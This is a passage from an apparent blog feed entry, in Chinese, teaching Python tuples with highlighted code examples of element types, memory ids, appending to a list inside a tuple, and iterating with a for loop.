class="hljs-title">print</span><span class="hljs-params">(t[<span class="hljs-number">1</span>],type(t[<span class="hljs-number">1</span>])</span></span>,<span class="hljs-built_in">id</span>(t<span class="hljs-selector-attr">[1]</span>)) #<span class="hljs-selector-attr">[20, 30]</span> &lt;class <span class="hljs-string">'list'</span>&gt; <span class="hljs-number">2150955913664</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t[<span class="hljs-number">2</span>],type(t[<span class="hljs-number">2</span>])</span></span>,<span class="hljs-built_in">id</span>(t<span class="hljs-selector-attr">[2]</span>)) #<span class="hljs-number">90</span> &lt;class <span class="hljs-string">'int'</span>&gt; <span class="hljs-number">2150843634832</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(id(<span class="hljs-number">100</span>)</span></span>) #<span class="hljs-number">2150843635152</span><br> #由于<span class="hljs-selector-attr">[20,30]</span>列表，而列表是可变序列，所以可以向列中添加元素，而列表的内存地址不变<br>t<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.append</span>(<span class="hljs-number">100</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t,id(t[<span class="hljs-number">1</span>])</span></span>) #<span class="hljs-selector-attr">[10, [20, 30, 100]</span>, <span class="hljs-number">90</span>] <span class="hljs-number">2150952344704</span><br></code></pre></td></tr></tbody></table></figure><p>（3）元组遍历</p><p>元组可迭代，用<code>for…in…</code>遍历</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">t=tuple((<span class="hljs-string">'Python'</span>,<span class="hljs-string">'hello'</span>,<span class="hljs-number">90</span>))<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">item</span> <span class="hljs-keyword">in</span> t:<br>    print(<span class="hljs-keyword">item</span>)<br> <span class="hljs-comment">#Python</span><br> <span class="hljs-comment">#hello</span><br> <span class="hljs-comment">#90</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;(啊，最近找工作找的心烦意乱，心浮气躁，都没办法静下心学习了，摆烂了好几天之后深觉不应该如此，无论找工作怎么样子，每天的学习也不应该中断)&lt;/p&gt;
&lt;h1 id=&quot;字典&quot;&gt;&lt;a href=&quot;#字典&quot; class=&quot;headerlink&quot; title=&quot;字典&quot;&gt;&lt;/a&gt;字典&lt;</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
</feed>
